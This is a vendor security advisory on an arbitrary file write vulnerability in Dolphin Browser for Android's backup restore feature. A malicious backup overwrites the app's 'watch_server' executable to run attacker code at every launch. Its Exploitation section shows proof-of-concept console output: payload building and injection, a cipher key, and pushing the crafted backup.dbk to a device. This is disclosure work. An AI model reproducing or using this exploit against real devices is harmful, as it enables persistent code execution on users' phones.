### [VS-2017-001] Dolphin Browser Backup & Restore Arbitrary File Write Vulnerability

```
Download: https://play.google.com/store/apps/details?id=mobi.mgeek.TunnyBrowser&hl=en
Author: Benjamin Watson of VerSprite Security
Affected: < 12.0.2
```

#### Vulnerability Details

The Backup and Restore feature in Mobotap's Dolphin Browser for Android 12.0.2, suffers from an arbitrary file write vulnerability when attempting to restore browser settings from a malicious Dolphin Browser backup file. This arbitrary file write vulnerability, allows an attacker to overwrite a specific executable in the Dolphin Browser's data directory with a crafted malicious executable. Every time the Dolphin Browser is launched, it will attempt to run the malicious executable from disk, thus executing the attacker's code.

#### Exploitation

Exploitation occurs when the arbitrary file write is used to overite the `/files/watch_server` executable with a crafted payload.  Once the **Dolphin Browser** is launched, it will always attempt to execute the `watch_server` from disk.

```bash
./build.sh                                                                                                                                                                              130 â†µ
[+] Building ... [!]
[armeabi-v7a] Install        : payload => libs/armeabi-v7a/payload
[+] Creating tmp.zip and injecting payload [!]
[+] Launching backup file format generation [!]
[+] Generating cipher [!]
[+] key --> 95acde261f3e09d281498163958dd366
[+] Building backup  --> ./backup.dbk [!]
[+] Encrypting and saving backup [!]
[+] Cleaning up [!]
[+] Pushing backup.dbk to the device [!]
backup.dbk: 1 file pushed. 0.6 MB/s (13926 bytes in 0.024s)
[+] Waiting on restore process ... [!]
--------- beginning of system
--------- beginning of main
V/FlipperFlapper(31220): uid=10177(u0_a177) gid=10177(u0_a177) groups=1015(sdcard_rw),1028(sdcard_r),3003(inet),9997(everybody),50177(all_a177) context=u:r:untrusted_app:s0
```
